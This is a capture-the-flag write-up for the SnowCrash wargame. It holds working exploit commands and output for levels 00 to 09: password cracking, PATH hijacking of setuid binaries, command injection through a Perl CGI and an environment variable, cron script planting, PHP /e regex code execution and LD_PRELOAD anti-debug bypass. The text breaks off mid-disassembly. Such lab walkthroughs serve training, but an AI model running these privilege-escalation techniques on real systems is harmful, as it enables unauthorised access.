# Snowcrash

## Level00

- Find the hidden 'john' file

```bash
level00@SnowCrash:~$ find / -user flag00 2> /dev/null
/usr/sbin/john
/rofs/usr/sbin/john
```

```bash
level00@SnowCrash:~$ cat /usr/sbin/john 
cdiiddwpgswtgt
```

- Decrypt it

https://www.dcode.fr/caesar-cipher

Caesar cipher +15: `nottoohardhere`

- Change user to `flag01` & `level01`

```bash
su flag00
<<< 'nottoohardhere'
```
```bash
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias

flag00@SnowCrash:~$ su level01
<<< x24ti5gi3x0ol2eh4esiuxias

flag01@SnowCrash:~$
```

## Level01

- /etc/passwd contains a passwd not in the /etc/shadow file (not marked with an 'x')

```
> cat /etc/passwd
level13:x:2013:2013::/home/user/level13:/bin/bash
level14:x:2014:2014::/home/user/level14:/bin/bash
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
...
```

- Documentation of the unix salt passwd implementation

https://www.oreilly.com/library/view/practical-unix-and/0596003234/ch04s03.html

https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/

### Cracking the /etc/passwd entry

- Fire up a virtual machine to install John The ripper

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=http://path-to-repo/sample.git)

```bash
sudo apt-get update
sudo apt-get install -y john
```

- Copy the passwd entry in a file

```bash
echo "flag01:42hDRfypTqqnw" > passwd

user@cloudshell:~$ john passwd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (flag01)
1g 0:00:00:00 100% 2/3 14.28g/s 19900p/s 19900c/s 19900C/s raquel..bigman 
Use the "--show" option to display all of the cracked passwords reliably
Session completed         
```

### Login to level02

```bash
su flag01 <<< 'abcdef'

flag01> getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf

su level02 <<< 'f2av5il02puano7naaf6adaaf'
```

## Level02

### Find pcap file

```bash
level02@SnowCrash:~$ ls
level02.pcap
```

### Analyse pcap file

https://packettotal.com/app/analysis?id=cf308a96d1fed07984010db2e5cf8f31

https://serverfault.com/questions/38626/how-can-i-read-pcap-files-in-a-friendly-format/38632

https://stackoverflow.com/questions/13160309/conversion-hex-string-into-ascii-in-bash-command-line

```bash
tcpdump -qns 0 -A -r level02.pcap
```

### Filter only data from tcp packets

- Create a file with data from tcp frames

```bash
tshark -r level02.pcap -T fields -e data > data
```

- Convert hex to printable chars

```bash
cat data  | tr -d '\n' | xxd -r -p

%%& #'$& #'$ #' 38400,38400#SodaCan:0'DISPLAYSodaCan:0xterm"!""bb       B

1!""!"""


Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

wwwbugs login: lleevveellXX
Password: ft_wandrNDRelL0L

Login incorrect
wwwbugs login: 
```

### Filtering the password

- Strange characters appears when showing non-printable characters around the `Password` area

```bash
cat data  | tr -d '\n' | cut -c701- | xxd -r -p | cat -e
 (pts/10)^M$
$
^A^@wwwbugs login: l^@le^@ev^@ve^@el^@lX^@X^M^A^@^M$
Password: ft_wandr^?^?^?NDRel^?L0L^M^@^M$
^A^@^M$
Login incorrect^M$
```

- The non-printable chars appears to be `DEL` characters

https://www.asciitable.com/

```bash
cat data  | tr -d '\n' | cut -c825-900 | xxd -r -p | cat -e                                                                              
ft_wandr^?^?^?NDRel^?L0L^M^@^M$
^A^@^M$
Login inco
```

- Take raw hex output of the password:

```bash
cat data  | tr -d '\n' | cut -c825-868
66745f77616e64727f7f7f4e4452656c7f4c304c0d00
```

- Remove characters after DEL characters until the cariage return

https://www.rapidtables.com/convert/number/hex-to-ascii.html

we get `66745f77614e4452654c304c` / `ft_waNDReL0L`

### Su to next level

```bash
level02@SnowCrash:~$ su flag02
Password:
<<< 'ft_waNDReL0L'
Don\'t forget to launch getflag !

flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq

flag02@SnowCrash:~$ su level03
Password:
<<< 'kooda2puivaav1idi4f57q8iq'

level03@SnowCrash:~$
```

## Level03

After switching to the level03 user, we are greeted by an executable file with special permissions, owned by flag03

```bash
level03@SnowCrash:~$ ls -la
total 24
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

The fact that it's an executable with special permissions made me think I should take control of the program to execute the `getflag` command

### Exploiting the binary

```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

- Filtering [strings](http://ix.io/27EI) from the program shows the program is using the echo binary in it's environment with [system(3)](http://man7.org/linux/man-pages/man3/system.3.html) to print the message instead of using write(2)

```bash
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
...
system
getegid
geteuid
__libc_start_main
...
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
...
/home/user/level03/level03.c
...

```

- We can use a different echo command

```bash
level03@SnowCrash:~$ which getflag
/bin/getflag

level03@SnowCrash:~$ mkdir test
mkdir: cannot create directory `test': Permission denied

level03@SnowCrash:~$ mktemp -d
/tmp/tmp.yJuq6aWVv2
level03@SnowCrash:~$ cp /bin/getflag /tmp/tmp.yJuq6aWVv2/echo
level03@SnowCrash:~$ chmod -R 777 /tmp/tmp.yJuq6aWVv2
```

- Then execute our new `echo` binary by modifing the `PATH` variable in the environment

```bash
level03@SnowCrash:~$ PATH=/tmp/tmp.yJuq6aWVv2 ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

### Go to level04

```bash
su level04
Password:
<<< 'qi0maab88jeaj46qoumi7maus'

level04@SnowCrash:~$
```

## Level04

```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

```bash
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html
```

### Finding the server

- A quick search to know how this CGI stuff works...

https://www.cs.ait.ac.th/~on/O/oreilly/perl/learn32/ch18_04.htm

- Find the server behind this

```bash
level04@SnowCrash:~$ netstat -plnt
(No info could be read for "-p": geteuid()=2004 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
```

```html
level04@SnowCrash:~$ curl  localhost:4646/level04.pl?x=test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level04.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4646</address>
</body></html>
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x=test
test
```

```html
level04@SnowCrash:~$ curl  localhost:80/level04.pl?x=test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level04.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

```bash
level04@SnowCrash:~$ curl  localhost:4242/level04.pl?x=test
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7
Protocol mismatch.
curl: (56) Recv failure: Connection reset by peer
```

### Then exploiting it

- Some documentation .... 

https://www.tutorialspoint.com/perl/perl_subroutines.htm

https://stackoverflow.com/questions/3589837/what-is-the-significance-of-an-underscore-in-perl

https://www.stat.berkeley.edu/~spector/extension/perl/notes/node73.html

https://alvinalexander.com/perl/edu/articles/pl010003.shtml

After testing some things, something made me think we're executing a shell

```bash
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x='$$'
6260
```

As the code only executes the 1st parameter, I had to find a way to run `getflag` in the same command of `echo`

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls | echo '
ls
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls|whoami'
flag04
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls|getflag'

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

### Go to level05

```bash
su level05
Password:
<<< 'ne2searoevaevoem4ov4ar8ap'

level05@SnowCrash:~$
```

## Level 05

```bash
level05@10.11.200.163's password:
You have new mail.
level05@SnowCrash:~$
```

When switching to user level05, we are greeted by a notification saying we received a mail

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Inspecting the mail file gives us a cronjob running every 2 minutes, executing a binary located in `/usr/sbin`

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

When inspecting the executed file, we can see it executes the content of every file located in `/opt/openarenaserver/` in a new `bash` shell, then removes the file

### Exploit

The goal will be to make the cronjob execute `getflag`, with the content of the output in a new file for us to retrieve the flag

We can create a temporary file with `mktemp` and allow the cronjob to write to it with a `chmod`

```bash
level05@SnowCrash:~$ mktemp
/tmp/tmp.8ir7nD1H2g

level05@SnowCrash:~$ chmod 777 /tmp/tmp.8ir7nD1H2g
```

Then we create a new script file in `/opt/openarenaserver/` with the command we want the cronjob to execute, in our case, `getflag` redirected to our temporary file

```bash
level05@SnowCrash:~$ echo "getflag > /tmp/tmp.8ir7nD1H2g" > /opt/openarenaserver/exploit.sh

level05@SnowCrash:~$ chmod 777 /opt/openarenaserver/exploit.sh  
```

Wait some time . . .

```bash
level05@SnowCrash:~$ cat /tmp/tmp.8ir7nD1H2g
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### Goto level 06

```bash
level05@SnowCrash:~$ su level06
Password:
<<< 'viuaaale9huek52boumoomioc'

level06@SnowCrash:~$
```

## Level 06

When logging in to level 06, we can find two files in our home directory, a php file and a binary with the same name, both owned by `flag06`

```bash
level06@SnowCrash:~$ ls -lA
total 24
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

At the first look, we can see the php script takes 2 command-line arguments, opens a file with the 1st one, makes some regex replacements on the content of the file, but the 2nd variable is unused

After experimenting with the binary with various arguments, we can see we get the same output whether we use the binary file or the php script.

### Exploit

This was a tricky one and needed a lot of documentation, when looking for the usage of the `/e` regex modifier, I found it was deprecated since a long time and the version of php on the machine was outdated

- https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
- https://stackoverflow.com/questions/19245205/replace-deprecated-preg-replace-e-with-preg-replace-callback

```bash
level06@SnowCrash:~$ php --version
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

When learning about the vulnerabilites of this modifier, I found some examples of exploitation of it:

- https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
- http://www.madirish.net/402
- https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
- https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection

To exploit it we firstly needed a text file which would be read by the binary, saved in the `$a` variable

```bash
level06@SnowCrash:~$ mktemp
/tmp/tmp.kiGPcYouaI

level06@SnowCrash:~$ chmod 777 /tmp/tmp.kiGPcYouaI
```

After some documentation about how to execute functions stocked in strings in php

- https://www.php.net/manual/fr/language.types.string.php

```bash
level06@SnowCrash:~$ echo '[x {${shell_exec($z)}}}]' > /tmp/tmp.kiGPcYouaI.1
level06@SnowCrash:~$ echo 'getflag' > /tmp/tmp.kiGPcYouaI.2

level06@SnowCrash:~$ ./level06 /tmp/tmp.kiGPcYouaI.1 $(cat /tmp/tmp.kiGPcp/tmp.kiGPcYouaI.2)
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
}
```

## Level07

When logging in to level07, a level07 binary can be found in the home directory

```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

When running the binary into `ltrace`, we can see the binary is using `system(3)`, which can be easily exploitable, and a `getenv()` call on the `LOGNAME` variable

```bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7c4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                     = 2007
geteuid()                                                                                                     = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0
getenv("LOGNAME")                                                                                             = "level07"
asprintf(0xbffff714, 0x8048688, 0xbfffff4c, 0xb7e5ee55, 0xb7fed280)                                           = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                        = 0
+++ exited (status 0) +++
```

When trying to modify the content of the `LOGNAME` variable, we can see the program also changes it's output, we know the program is running `/bin/echo` on `LOGNAME`.

At this point, we can easily guess how to run the `getflag` command in the `system(3)` call

```bash
level07@SnowCrash:~$ env LOGNAME=';getflag' ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Level08

```bash
level08@SnowCrash:~$ ls -lA
total 28
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]

level08@SnowCrash:~$ ./level08 ./token
You may not access './token'

level08@SnowCrash:~$ ltrace ./level08 ./token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("./token", "token")                                                                                                = "token"
printf("You may not access '%s'\n", "./token"You may not access './token'
)                                                                            = 29
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```

```bash
level08@SnowCrash:~$ pwd
/home/user/level08

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/lolol

level08@SnowCrash:~$ ls -la /tmp/lolol
lrwxrwxrwx 1 level08 level08 24 Jan 27 19:18 /tmp/lolol -> /home/user/level08/token

level08@SnowCrash:~$ ./level08 /tmp/lolol
quif5eloekouj29ke0vouxean
```

```bash
❯ ssh flag08@10.12.1.143 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.12.1.143

flag08@10.12.1.143's password:
Don't forget to launch getflag !

flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Level09

```bash
level09@SnowCrash:~$ ls -lA
total 24
-r-x------ 1 level09 level09  220 Apr  3  2012 .bash_logout
-r-x------ 1 level09 level09 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09
-r-x------ 1 level09 level09  675 Apr  3  2012 .profile
----r--r-- 1 flag09  level09   26 Mar  5  2016 token
```

When running with ltrace, a different message appears

```bash
level09@SnowCrash:~$ ./level09
You need to provied only one arg.
level09@SnowCrash:~$ ltrace  ./level09
__libc_start_main(0x80487ce, 1, 0xbffff7f4, 0x8048aa0, 0x8048b10 <unfinished ...>
ptrace(0, 0, 1, 0, 0xb7e2fe38)                                                                                            = -1
puts("You should not reverse this"You should not reverse this
)                                                                                       = 28
+++ exited (status 1) +++
level09@SnowCrash:~$
```

Same thing with strace ....

```bash
level09@SnowCrash:~$ ./
.bash_logout  .bashrc       level09       .profile
level09@SnowCrash:~$ ./level09 ./token
.0vrojt
level09@SnowCrash:~$ strace ./level09 ./token
execve("./level09", ["./level09", "./token"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
ptrace(PTRACE_TRACEME, 0, 0x1, 0)       = -1 EPERM (Operation not permitted)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "You should not reverse this\n", 28You should not reverse this
) = 28
exit_group(1)                           = ?
level09@SnowCrash:~$
```

Documentation about ptrace(2), -> Google related result `ptrace anti debug`

The binary is doing the somewhat famous in the reverse engineering community 'ptrace anti-debug' trick

- https://aaronyoo.github.io/ptrace-anti-debug.html

```text
For the ptrace anti-debug mechanism, the program tries to call ptrace on itself.
This will fail if the program is being debugged and will succeed if the program is not being debugged because no two tracers can trace the same tracee. 
```

This explains why we get the following line in our strace() output !

```bash
ptrace(PTRACE_TRACEME, 0, 0x1, 0)       = -1 EPERM (Operation not permitted)
```

### Exploiting the binary

```bash
level09@SnowCrash:~$ mktemp  -d
/tmp/tmp.98mqTFCvW9

level09@SnowCrash:~$ cd /tmp/tmp.98mqTFCvW9
```

```bash
nano inject.c
long ptrace(int a, int b, void *c, void *d) {
        return 0; // Redefine ptrace()
}
```

```bash
level09@SnowCrash:/tmp/tmp.98mqTFCvW9$ gcc -shared -fPIC -o ptrace_inject.so inject.c

level09@SnowCrash:/tmp/tmp.98mqTFCvW9$ ltrace env LD_PRELOAD=./ptrace_inject.so /home/user/level09/level09 /home/user/level09/token
__libc_start_main(0x8048db0, 4, 0xbffff794, 0x804b700, 0x804b770 <unfinished ...>
strrchr("env", '/')                                                                                                       = NULL
setlocale(6, "")                                                                                                          = "en_US.UTF-8"
bindtextdomain("coreutils", "/usr/share/locale")                                                                          = "/usr/share/locale"
textdomain("coreutils")                                                                                                   = "coreutils"
__cxa_atexit(0x8049500, 0, 0, 0xbffff794, 4)                                                                              = 0
getopt_long(4, 0xbffff794, "+iu:0", 0x0804bc40, NULL)                                                                     = -1
getopt_long(4, 0xbffff794, "+iu:0", 0x0804bc40, NULL)                                                                     = -1
strchr("LD_PRELOAD=./ptrace_inject.so", '=')                                                                              = "=./ptrace_inject.so"
putenv("LD_PRELOAD=./ptrace_inject.so")                                                                                   = 0
strchr("/home/user/level09/level09", '=')                                                                                 = NULL
execvp(0xbffff8d9, 0xbffff79c, 0x804bbea, 0x804bc40, 0 <unfinished ...>
--- Called exec() ---
__libc_start_main(0x80487ce, 2, 0xbffff784, 0x8048aa0, 0x8048b10 <unfinished ...>
ptrace(0, 0, 1, 0, 0xb7e2ce38)                                                                                            = 0
getenv("LD_PRELOAD")                                                                                                      = "./ptrace_inject.so"
fwrite("Injection Linked lib detected ex"..., 1, 37, 0xb7fce980Injection Linked lib detected exit..
)                                                          = 37
+++ exited (status 1) +++
```

Looks like the binary is not that idiot...

LD_PRELOAD=/tmp/tmp.Lhnb115oZ5/ptrace_inject.so

### Exploiting the binary (2)

```bash
level09@SnowCrash:~$ gdb ./level09
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level09/level09...(no debugging symbols found)...done.
(gdb) run ./token
Starting program: /home/user/level09/level09 ./token
You should not reverse this
[Inferior 1 (process 7400) exited with code 01]

(gdb) layout asm


(gdb) set environment LD_PRELOAD /tmp/tmp.98mqTFCvW9/ptrace_inject.so
```


```asm
(gdb) disas /m main
Dump of assembler code for function main:
   0x080487ce <+0>:     push   %ebp
   0x080487cf <+1>:     mov    %esp,%ebp
   0x080487d1 <+3>:     push   %edi
   0x080487d2 <+4>:     push   %ebx
   0x080487d3 <+5>:     and    $0xfffffff0,%esp
   0x080487d6 <+8>:     sub    $0x130,%esp
   0x080487dc <+14>:    mov    0xc(%ebp),%eax
   0x080487df <+17>:    mov    %eax,0x1c(%esp)
   0x080487e3 <+21>:    mov    %gs:0x14,%eax
   0x080487e9 <+27>:    mov    %eax,0x12c(%esp)
   0x080487f0 <+34>:    xor    %eax,%eax
   0x080487f2 <+36>:    movl   $0x0,0x24(%esp)
   0x080487fa <+44>:    movl   $0xffffffff,0x20(%esp)
   0x08048802 <+52>:    movl   $0x0,0xc(%esp)
   0x0804880a <+60>:    movl   $0x1,0x8(%esp)
   0x08048812 <+68>:    movl   $0x0,0x4(%esp)
   0x0804881a <+76>:    movl   $0x0,(%esp)
   0x08048821 <+83>:    call   0x80484e0 <ptrace@plt> ; Check if ptrace() fails with -1
   0x08048826 <+88>:    test   %eax,%eax ; Reassign $eax to 0: break *0x8048826 && info all-registers && set $eax = 0;
   0x08048828 <+90>:    jns    0x8048840 <main+114> ; Jump if not equal ($eax / -1)
   0x0804882a <+92>:    movl   $0x8048b70,(%esp) ; gdb) printf "%s", 0x8048b70 -> You should not reverse this
   0x08048831 <+99>:    call   0x8048480 <puts@plt> ; Print 'You should not reverse this'
   0x08048836 <+104>:   mov    $0x1,%eax
   0x0804883b <+109>:   jmp    0x8048a77 <main+681> ; Goto exit()
   0x08048840 <+114>:   movl   $0x8048b8c,(%esp) ;  printf "%s", 0x8048b8c -> LD_PRELOAD
   0x08048847 <+121>:   call   0x8048470 <getenv@plt> ; Check LD_PRELOAD env variable content
   0x0804884c <+126>:   test   %eax,%eax ; Check if getenv returned NULL
   0x0804884e <+128>:   je     0x8048882 <main+180> ; Jump if getenv("LD_PRELOAD") equals NULL
   0x08048850 <+130>:   mov    0x804a040,%eax
   0x08048855 <+135>:   mov    %eax,%edx
   0x08048857 <+137>:   mov    $0x8048b98,%eax ; (gdb) printf "%s", 0x8048b98 -> ��Injection Linked lib detected exit..
   0x0804885c <+142>:   mov    %edx,0xc(%esp)
   0x08048860 <+146>:   movl   $0x25,0x8(%esp)
   0x08048868 <+154>:   movl   $0x1,0x4(%esp)
   0x08048870 <+162>:   mov    %eax,(%esp)
   0x08048873 <+165>:   call   0x8048460 <fwrite@plt> ; fwrite 'Injection linked lib detected exit..'
   0x08048878 <+170>:   mov    $0x1,%eax
   0x0804887d <+175>:   jmp    0x8048a77 <main+681> ; Goto exit
   0x08048882 <+180>:   movl   $0x0,0x4(%esp)
   0x0804888a <+188>:   movl   $0x8048bbe,(%esp) ; (gdb) printf "%s", 0x8048bbe -> /etc/ld.so.preload
   0x08048891 <+195>:   call   0x80484a0 <open@plt> ; open /etc/ld.so.preload https://unix.stackexchange.com/questions/282057/what-would-suddenly-cause-programs-to-read-etc-ld-so-preload-when-they-start-up
   0x08048896 <+200>:   test   %eax,%eax ; Check if open /etc/ld.so.preload returned -1 to know if we're messing with preload functions
   0x08048898 <+202>:   jle    0x80488cc <main+254> ; jump if (x <= y) (-1 < 0)
   0x0804889a <+204>:   mov    0x804a040,%eax
   0x0804889f <+209>:   mov    %eax,%edx
   0x080488a1 <+211>:   mov    $0x8048b98,%eax ; (gdb) printf "%s", 0x8048b98 -> Injection Linked lib detected exit..
   0x080488a6 <+216>:   mov    %edx,0xc(%esp)
   0x080488aa <+220>:   movl   $0x25,0x8(%esp)
   0x080488b2 <+228>:   movl   $0x1,0x4(%esp)
   0x080488ba <+236>:   mov    %eax,(%esp)
   0x080488bd <+239>:   call   0x8048460 <fwrite@plt> ; Print 'Injection Linked lib detected exit..'
   0x080488c2 <+244>:   mov    $0x1,%eax
   0x080488c7 <+249>:   jmp    0x8048a77 <main+681> ; Goto exit()
   0x080488cc <+254>:   movl   $0x0,0x4(%esp)
   0x080488d4 <+262>:   movl   $0x8048bd1,(%esp) ; (gdb) printf "%s", 0x8048bd1 -> /proc/self/maps ; https://stackoverflow.com/questions/1401359/understanding-linux-proc-id-maps
   0x080488db <+269>:   call   0x80485a4 <syscall_open> ; open /proc/self/maps
   0x080488e0 <+274>:   mov    %eax,0x28(%esp) ; move open() return into %esp
   0x080488e4 <+278>:   cmpl   $0xffffffff,0x28(%esp) ;  Compare unsigned
   0x080488e9 <+283>:   jne    0x8048a50 <main+642> ; Jump if not equal -1
   0x080488ef <+289>:   mov    0x804a040,%eax
   0x080488f4 <+294>:   mov    %eax,%edx
   0x080488f6 <+296>:   mov    $0x8048be4,%eax ; (gdb) printf "%s", 0x8048be4 -> /proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..
   0x080488fb <+301>:   mov    %edx,0xc(%esp)
   0x080488ff <+305>:   movl   $0x46,0x8(%esp)
   0x08048907 <+313>:   movl   $0x1,0x4(%esp)
   0x0804890f <+321>:   mov    %eax,(%esp)
   0x08048912 <+324>:   call   0x8048460 <fwrite@plt> ; print /proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..
   0x08048917 <+329>:   mov    $0x1,%eax
   0x0804891c <+334>:   jmp    0x8048a77 <main+681> ; goto exit()
   0x08048921 <+339>:   movl   $0x8048c2b,0x4(%esp)
   0x08048929 <+347>:   lea    0x2c(%esp),%eax
   0x0804892d <+351>:   mov    %eax,(%esp)
